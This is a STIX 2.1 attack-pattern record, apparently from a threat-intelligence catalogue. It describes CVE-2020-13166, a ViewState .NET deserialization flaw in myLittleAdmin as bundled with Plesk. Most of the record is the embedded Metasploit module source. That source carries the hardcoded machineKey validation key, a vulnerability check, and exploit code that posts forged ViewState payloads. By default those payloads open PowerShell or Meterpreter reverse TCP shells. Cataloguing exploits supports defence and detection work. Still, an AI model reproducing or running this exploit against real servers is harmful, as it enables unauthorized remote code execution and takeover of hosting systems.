{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--85fad00d-c617-43d4-86d8-ecac6518ba41",
    "created": "2024-08-14T16:54:36.864529Z",
    "modified": "2024-08-14T16:54:36.864533Z",
    "name": "Plesk/myLittleAdmin ViewState .NET Deserialization",
    "description": " This module exploits a ViewState .NET deserialization vulnerability in web-based MS SQL Server management tool myLittleAdmin, for version 3.8 and likely older versions, due to hardcoded <machineKey> parameters in the web.config file for ASP.NET.  Popular web hosting control panel Plesk offers myLittleAdmin as an optional component that is selected automatically during \"full\" installation. This exploit caters to the Plesk target, though it should work fine against a standalone myLittleAdmin setup.  Successful exploitation results in code execution as the user running myLittleAdmin, which is IUSRPLESK_sqladmin for Plesk and described as the \"SQL Admin MSSQL anonymous account.\"  Tested on the latest Plesk Obsidian with optional myLittleAdmin 3.8. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/plesk_mylittleadmin_viewstate.rb",
            "external_id": "plesk_mylittleadmin_viewstate.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13166"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-mylittleadmin-preauth-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://portswigger.net/daily-swig/mylittleadmin-has-a-big-unpatched-security-flaw"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  # <input type=\"hidden\" name=\"__VIEWSTATEGENERATOR\" id=\"__VIEWSTATEGENERATOR\" value=\"CA0B0334\" />\n  VIEWSTATE_GENERATOR = 'CA0B0334'.freeze\n\n  # <machineKey\n  #   validationKey=\"5C7EEF6650639D2CB8FAA0DA36AF24452DCF69065F2EDC2C8F2F44C0220BE2E5889CA01A207FC5FCE62D1A5A4F6D2410722261E6A33E77E0628B17AA928039BF\"\n  #   decryptionKey=\"DC47E74EA278F789D2FF0E412AD840A89C10171F408D8AC4\"\n  #   validation=\"SHA1\" />\n  VIEWSTATE_VALIDATION_KEY =\n    \"\\x5c\\x7e\\xef\\x66\\x50\\x63\\x9d\\x2c\\xb8\\xfa\\xa0\\xda\\x36\\xaf\\x24\\x45\\x2d\\xcf\" \\\n    \"\\x69\\x06\\x5f\\x2e\\xdc\\x2c\\x8f\\x2f\\x44\\xc0\\x22\\x0b\\xe2\\xe5\\x88\\x9c\\xa0\\x1a\" \\\n    \"\\x20\\x7f\\xc5\\xfc\\xe6\\x2d\\x1a\\x5a\\x4f\\x6d\\x24\\x10\\x72\\x22\\x61\\xe6\\xa3\\x3e\" \\\n    \"\\x77\\xe0\\x62\\x8b\\x17\\xaa\\x92\\x80\\x39\\xbf\".freeze\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::ViewState\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Plesk/myLittleAdmin ViewState .NET Deserialization',\n        'Description' => %q{\n          This module exploits a ViewState .NET deserialization vulnerability in\n          web-based MS SQL Server management tool myLittleAdmin, for version 3.8\n          and likely older versions, due to hardcoded <machineKey> parameters in\n          the web.config file for ASP.NET.\n\n          Popular web hosting control panel Plesk offers myLittleAdmin as an\n          optional component that is selected automatically during \"full\"\n          installation. This exploit caters to the Plesk target, though it\n          should work fine against a standalone myLittleAdmin setup.\n\n          Successful exploitation results in code execution as the user running\n          myLittleAdmin, which is IUSRPLESK_sqladmin for Plesk and described as\n          the \"SQL Admin MSSQL anonymous account.\"\n\n          Tested on the latest Plesk Obsidian with optional myLittleAdmin 3.8.\n        },\n        'Author' => [\n          # Reported to SSD (SecuriTeam) by an anonymous researcher\n          # Publicly disclosed by Noam Rathaus of SSD (SecuriTeam)\n          'Spencer McIntyre', # Inspiration\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-13166'],\n          ['URL', 'https://ssd-disclosure.com/ssd-advisory-mylittleadmin-preauth-rce/'],\n          ['URL', 'https://portswigger.net/daily-swig/mylittleadmin-has-a-big-unpatched-security-flaw']\n        ],\n        'DisclosureDate' => '2020-05-15', # SSD (SecuriTeam) advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'WfsDelay' => 10 # First exploit attempt may be a little slow\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8401, true, 'The myLittleAdmin port (default for Plesk!)'),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200 && res.body.include?('myLittleAdmin for SQL Server')\n      return CheckCode::Unknown('Target is not running myLittleAdmin.')\n    end\n\n    vprint_good(\"myLittleAdmin is running at #{full_uri}\")\n    check_viewstate(res.get_html_document)\n  end\n\n  def check_viewstate(html)\n    viewstate = html.at('//input[@id = \"__VIEWSTATE\"]/@value')&.text\n\n    unless viewstate\n      return CheckCode::Detected(\"__VIEWSTATE not found, can't complete check.\")\n    end\n\n    @viewstate_generator =\n      html.at('//input[@id = \"__VIEWSTATEGENERATOR\"]/@value')&.text\n\n    unless @viewstate_generator\n      print_warning('__VIEWSTATEGENERATOR not found, using known default value')\n      @viewstate_generator = VIEWSTATE_GENERATOR\n    end\n\n    # ViewState generator needs to be a packed integer now\n    @viewstate_generator = [@viewstate_generator.to_i(16)].pack('V')\n\n    we_can_sign_viewstate = can_sign_viewstate?(\n      viewstate,\n      extra: @viewstate_generator,\n      key: VIEWSTATE_VALIDATION_KEY\n    )\n\n    if we_can_sign_viewstate\n      return CheckCode::Vulnerable('We can sign our own ViewState.')\n    end\n\n    CheckCode::Safe(\"We can't sign our own ViewState.\")\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'vars_post' => {\n        # This is the only parameter we need for successful exploitation!\n        '__VIEWSTATE' => generate_viewstate_payload(\n          cmd,\n          extra: @viewstate_generator,\n          key: VIEWSTATE_VALIDATION_KEY\n        )\n      }\n    )\n\n    unless res && res.code == 302 && res.redirection.path == '/error/index.html'\n      fail_with(Failure::PayloadFailed, \"Could not execute command: #{cmd}\")\n    end\n\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-05-15, # SSD SecuriTeam advisory",
    "x_mitre_platforms": [
        "win'"
    ]
}